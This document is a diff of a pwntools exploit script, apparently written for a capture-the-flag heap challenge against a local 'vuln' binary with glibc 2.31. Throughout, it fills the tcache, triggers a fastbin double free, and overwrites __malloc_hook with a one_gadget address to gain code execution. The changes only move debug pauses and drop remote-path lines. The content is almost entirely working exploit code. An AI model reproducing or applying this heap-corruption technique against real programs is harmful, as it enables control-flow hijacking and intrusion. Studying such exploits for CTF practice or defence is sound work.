@@ -10,9 +10,6 @@ f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
 
 vuln_path, libc_path = "./vuln", "./libc.so.6"
-if f_remote:
-   vuln_path = "./vuln.bak"
-   #libc_path = "/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so"
 
 success(libc_path)
 elf, rop = ELF(vuln_path), ROP(vuln_path)
@@ -73,18 +70,15 @@ realloc_address = libc.sym['realloc']
 success("realloc_address -> " + hex(realloc_address))
 success("system -> " + hex(libc.symbols["system"]))
 
-ddebug()
 for i in range(7):
     add(i, 0x60, "abc")
 add(7, 0x60, "abc")
 add(8, 0x60, "abc")
 add(9, 0x60, "abc")
 
-pause()
 for i in range(7):
     delete(i)
 
-pause()
 delete(7)
 delete(8)
 delete(7)
@@ -92,12 +86,13 @@ delete(7)
 for i in range(7):
     add(i, 0x60, "abc")
 
+ddebug()
 add(7, 0x60, p64(_malloc_hook_address))
 
 # fastbin --> tcache (0x70)   tcache_entry[5](3): 0x560f6f69aa60 --> 0x560f6f69a9f0 --> 0x7f506946cb70
-add(8, 0x60, p64(0))
+add(8, 0x60, p64(0x123456))
 
-add(9, 0x60, p64(0))
+add(9, 0x60, p64(0xaabbccddef))
 
 one = libc.address + 0xe3b01
 add(10, 0x60, p64(one))
